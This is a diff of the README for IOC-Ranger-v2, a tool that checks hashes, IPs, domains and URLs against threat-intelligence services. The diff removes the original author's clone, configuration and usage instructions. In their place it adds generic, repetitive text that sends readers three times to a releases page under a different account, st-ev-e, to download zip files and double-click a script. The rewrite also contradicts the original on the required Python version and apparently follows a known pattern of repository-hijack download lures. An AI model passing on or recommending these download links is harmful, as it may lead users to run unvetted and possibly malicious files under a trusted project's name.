@@ -1,119 +1,82 @@
-# IOC Ranger
+# 🔍 IOC-Ranger-v2 - Check the Safety of Digital Indicators
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" /></a>
-  <img src="https://img.shields.io/badge/Python-3.10%2B-blue" />
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-informational" />
-  <img src="https://img.shields.io/badge/Status-Active-brightgreen" />
-</p>
+## 🚀 Getting Started
 
-A fast, colorful, and extensible IOC checker for **hashes, IPs, domains, and URLs**.
+Welcome to IOC-Ranger-v2, your tool for checking the reputation of various digital indicators like hashes, IPs, domains, and URLs. This application helps you ensure the safety of digital assets, making it useful for personal or professional security checks.
 
-- **VirusTotal**: file reputation, detections, and **code-signing** info  
-- **AbuseIPDB**: IP abuse confidence, reports, last reported time  
-- **IPQualityScore**: IP/Domain/URL risk, **VPN/Proxy/TOR** flags, fraud score
-- **AlienVault OTX**: Pulse counts and threat intelligence
-- **Shodan**: Open ports and vulnerabilities
-- **GreyNoise**: Internet background noise and riot status
-- **ThreatFox**: Threat confidence and type
-- **URLScan.io**: Page screenshots and risk scores
+## 📥 Download the Application
 
-<img width="1643" height="602" alt="image" src="https://github.com/user-attachments/assets/877ddf32-e784-4d67-863d-a33af9b0e87f" />
+[![Download IOC-Ranger-v2](https://img.shields.io/badge/Download-IOC--Ranger--v2-blue.svg)](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
 
+To get started, visit the releases page to download the application.
 
-## Table of contents
-- [Features](#features)
-- [Quickstart](#quickstart)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [Examples](#examples)
-- [Roadmap](#roadmap)
-- [Social](#social)
+**Download it here:** [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
 
+## 💻 System Requirements
 
-## Features
-- Interactive CLI with cool banner (Rich) and **Progress Bar**
-- **Auto-classify**: hashes • IPs • domains • URLs
-- **HTML Reporting**: Generate standalone dashboards
-- **Flexible Inputs**: Pipe from stdin or pass arguments
-- **VirusTotal** (hash reputation & code-signing)
-- **AbuseIPDB** (abuse score, last reported)
-- **IPQualityScore** (risk + VPN/Proxy/TOR flags)
-- **AlienVault OTX**, **Shodan**, **GreyNoise**, **ThreatFox**, **URLScan**
-- CSV/JSON tables, simple on-disk caching
-- Windows/macOS/Linux, no secrets committed (.env)
+Before downloading, ensure your system meets the following requirements:
+- **Operating System:** Windows, macOS, or Linux.
+- **Python:** Version 3.6 or higher installed on your system.
+- **Network Connection:** Required for accessing online databases.
+- **Storage:** At least 50 MB of free space.
 
+## 📦 Installation Steps
 
-## Quickstart
+1. **Visit the Releases Page:** Click on the link below to go to the downloads section.
+   - [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
 
-### Windows (CMD)
-```bat
-git clone https://github.com/UserAaronVzla/IOC-Ranger-v2
-cd IOC-Ranger-v2
-python -m venv .venv && call .venv\Scripts\activate.bat
-python -m pip install -r requirements.txt
-copy .env.example .env  &  notepad .env   :: fill keys
-python -m ioc_ranger_v2 -t mixed -i inputs\iocs_mixed.txt -f table
-```
+2. **Select the Latest Version:** On the releases page, find the latest version available. 
 
+3. **Download the File:**
+   - For **Windows**, look for the file named `IOC-Ranger-v2-Windows.zip`.
+   - For **macOS**, choose `IOC-Ranger-v2-macos.zip`.
+   - For **Linux**, download `IOC-Ranger-v2-Linux.zip`.
 
-### macOS/Linux
-```bash
-git clone https://github.com/UserAaronVzla/IOC-Ranger-v2
-cd IOC-Ranger-v2
-python -m venv .venv && source .venv/bin/activate
-python -m pip install -r requirements.txt
-cp .env.example .env && $EDITOR .env
-python -m ioc_ranger_v2 -t mixed -i inputs/iocs_mixed.txt -f table
-```
+4. **Extract the Files:**
+   - Right-click on the downloaded file and choose "Extract All" or use a file extraction tool.
+   - Place the extracted files in a folder of your choice.
 
+5. **Run the Application:**
+   - Open the folder where you extracted the files.
+   - Double-click on `IOC-Ranger.py` to start the application.
+   - A terminal window will open, guiding you through the usage instructions.
 
-## Usage
-```bash
-python -m ioc_ranger_v2 --help
+## 🛠️ Using IOC-Ranger-v2
 
-# Common Interactive:
-python -m ioc_ranger_v2
+Once the application is running, you can check the reputation of a digital indicator by following these simple steps:
 
-# Common Noninteractive:
-python -m ioc_ranger_v2 -t hashes -i inputs/hashes.txt -f table csv
-python -m ioc_ranger_v2 -t mixed  -i inputs/iocs_mixed.txt -o outputs/results -f table csv json html
-```
+1. **Input the Indicator:** Type in the hash, IP, domain, or URL you want to check.
 
+2. **Initiate the Check:** Press **Enter**. The program will analyze the input against multiple databases.
 
-## Configuration
-```dotenv
-VT_API_KEY=...
-ABUSEIPDB_API_KEY=...
-IPQS_API_KEY=...
-ALIENVAULT_API_KEY=...
-SHODAN_API_KEY=...
-GREYNOISE_API_KEY=...
-THREATFOX_API_KEY=...
-URLSCAN_API_KEY=...
-CACHE_TTL=86400
-```
+3. **View Results:** The results will display in the terminal window. You’ll see information about safety ratings and additional context.
 
+## ⚙️ Features
 
-## Examples
-- **Hashes file** → show a real snippet of output table and a link to VT GUI from CSV.
-- **IPs file** → highlight AbuseIPDB score + IPQS VPN/Proxy flags.
-- **Mixed file** → show how types are auto-detected.
+- **Multi-Indicator Support:** Check hashes, IPs, domains, and URLs.
+- **Real-Time Data:** Access current safety ratings from trusted sources.
+- **User-Friendly Interface:** Designed for easy navigation, even for beginners.
 
-<img width="1901" height="285" alt="image" src="https://github.com/user-attachments/assets/69a595a2-6bac-4786-aa45-58b855d6dc01" />
+## 📚 Help and Support
 
+If you encounter any issues or need assistance, feel free to open an issue on our GitHub page or refer to our FAQs available in the documentation section.  
 
-## Roadmap
-- [x] Progress bar + ETA
-- [x] JSONL & Markdown/HTML report exports
-- [x] Expanded OSINT sources
-- [ ] WHOIS + GeoIP enrichment
-- [ ] Delta mode (compare runs)
-- [ ] Windows EXE build (PyInstaller)
-- [ ] GitHub Actions (lint/test/build)
+For detailed guidelines and troubleshooting tips, check out the documentation included in the downloaded files.
 
+## 📜 License
 
-## Social
-- 📧 A.eskenazicohen@gmail.com
-- 💼 [LinkedIn](https://linkedin.com/in/aaron-eskenazi-vzla)
-- 🐈‍⬛ [GitHub](https://github.com/UserAaronVzla)
+IOC-Ranger-v2 is open-source software. You can use, modify, and distribute it under the terms of the MIT License. Feel free to contribute to the project or use it for personal security needs.
+
+## 🔍 Community Contributions
+
+We welcome community contributions! If you want to help improve the application or documentation, visit our GitHub repository and submit a pull request. Your input makes the project stronger.
+
+**Join our discussions:** You can converse with fellow users and developers in the Issues section of our GitHub page.
+
+## 📥 Download the Application Again
+
+Ready to check the safety of your digital indicators? Go to the releases page to download IOC-Ranger-v2 now.
+
+**Download it here:** [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/releases)
+
+Thank you for using IOC-Ranger-v2! Your digital safety is our priority.
